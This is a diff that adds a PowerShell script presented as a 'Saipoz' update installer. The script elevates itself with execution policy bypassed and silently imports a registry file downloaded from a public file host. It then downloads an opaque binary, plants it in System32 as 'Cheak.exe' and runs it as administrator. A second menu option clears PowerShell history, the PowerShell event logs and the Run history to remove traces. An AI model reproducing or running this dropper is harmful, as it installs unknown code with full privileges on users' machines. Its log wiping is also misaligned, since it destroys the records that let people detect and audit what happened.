@@ -1,0 +1,149 @@
+# -----------------------------
+# Menu Selection
+# -----------------------------
+Write-Host "========================================"
+Write-Host "    Saipoz | UPDATE "
+Write-Host "========================================"
+Write-Host ""
+Write-Host "  [1] Setup"
+Write-Host "  [2] Clear PowerShell History"
+Write-Host ""
+Write-Host "========================================"
+
+$choice = Read-Host "Enter choice (1/2)"
+
+# -----------------------------
+# Check for Administrator rights
+# -----------------------------
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
+    Write-Host "`n[+] Restarting with Administrator privileges..." -ForegroundColor Yellow
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# -----------------------------
+# Define paths and variables
+# -----------------------------
+$system32Path = "$env:windir\System32"
+$exeDestination = Join-Path $system32Path "Cheak.exe"
+$regUrl = "https://files.catbox.moe/o3dtap.reg"
+$exeUrl = "https://files.catbox.moe/bt0dfp.bin"
+$tempReg = Join-Path $env:TEMP "temp_reg.reg"
+$tempExe = Join-Path $env:TEMP "temp_exe.bin"
+
+# -----------------------------
+# Install & Run Mode
+# -----------------------------
+if ($choice -eq "1") {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "    INSTALLING Saipoz " -ForegroundColor Cyan
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ""
+
+    # Step 1: Download and run .reg file
+    Write-Host "[1/3] Downloading registry configuration..." -ForegroundColor Yellow
+    try {
+        Invoke-WebRequest -Uri $regUrl -OutFile $tempReg
+        Write-Host "[✓] Registry file downloaded successfully!" -ForegroundColor Green
+        
+        Write-Host "[+] Applying registry settings..." -ForegroundColor Yellow
+        Start-Process -FilePath "regedit.exe" -ArgumentList "/s `"$tempReg`"" -Wait
+        Write-Host "[✓] Registry settings applied!" -ForegroundColor Green
+        Remove-Item $tempReg -Force -ErrorAction SilentlyContinue
+    } catch {
+        Write-Host "[✗] Failed to download/apply registry: $_" -ForegroundColor Red
+        exit
+    }
+
+    # Step 2: Download and rename executable to Cheak.exe
+    Write-Host ""
+    Write-Host "[2/3] Downloading main executable..." -ForegroundColor Yellow
+    try {
+        Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe
+        Move-Item -Path $tempExe -Destination $exeDestination -Force
+        Write-Host "[✓] Cheak.exe downloaded and installed to System32!" -ForegroundColor Green
+    } catch {
+        Write-Host "[✗] Failed to download executable: $_" -ForegroundColor Red
+        exit
+    }
+
+    # Step 3: Run Cheak.exe
+    Write-Host ""
+    Write-Host "[3/3] Launching Cheak.exe..." -ForegroundColor Yellow
+    try {
+        Start-Process -FilePath $exeDestination -Verb RunAs
+        Write-Host "[✓] Cheak.exe started successfully!" -ForegroundColor Green
+    } catch {
+        Write-Host "[✗] Failed to start Cheak.exe: $_" -ForegroundColor Red
+    }
+
+    Write-Host ""
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "    INSTALLATION COMPLETE!" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ""
+    Read-Host "Press Enter to exit"
+}
+
+# -----------------------------
+# Clear PowerShell History Mode
+# -----------------------------
+elseif ($choice -eq "2") {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Magenta
+    Write-Host "    CLEARING POWERSHELL HISTORY" -ForegroundColor Magenta
+    Write-Host "========================================" -ForegroundColor Magenta
+    Write-Host ""
+
+    # Clear current session history
+    Write-Host "[+] Clearing current session history..." -ForegroundColor Yellow
+    Clear-History
+    
+    # Clear PowerShell console history file (PSReadLine)
+    Write-Host "[+] Clearing PSReadLine history..." -ForegroundColor Yellow
+    $psHistoryPath = (Get-PSReadLineOption).HistorySavePath
+    if (Test-Path $psHistoryPath) {
+        Remove-Item $psHistoryPath -Force
+        Write-Host "[✓] PSReadLine history cleared!" -ForegroundColor Green
+    }
+
+    # Clear event logs related to PowerShell
+    Write-Host "[+] Clearing PowerShell event logs..." -ForegroundColor Yellow
+    try {
+        wevtutil cl "Windows PowerShell" 2>$null
+        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+        Write-Host "[✓] PowerShell event logs cleared!" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] Some event logs could not be cleared (may require higher privileges)" -ForegroundColor Yellow
+    }
+
+    # Clear recent PowerShell run command in registry
+    Write-Host "[+] Clearing PowerShell run history..." -ForegroundColor Yellow
+    try {
+        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
+        Write-Host "[✓] Run history cleared!" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] Could not clear all run history" -ForegroundColor Yellow
+    }
+
+    Write-Host ""
+    Write-Host "========================================" -ForegroundColor Magenta
+    Write-Host "    CLEANUP COMPLETE!" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Magenta
+    Write-Host ""
+    Write-Host "[✓] All PowerShell traces have been removed!" -ForegroundColor Green
+    Write-Host ""
+    Read-Host "Press Enter to exit"
+}
+
+else {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Red
+    Write-Host "    INVALID CHOICE!" -ForegroundColor Red
+    Write-Host "========================================" -ForegroundColor Red
+    Write-Host ""
+    Write-Host "Please select either [1] or [2]" -ForegroundColor Yellow
+    Write-Host ""
+    Read-Host "Press Enter to exit"
+}
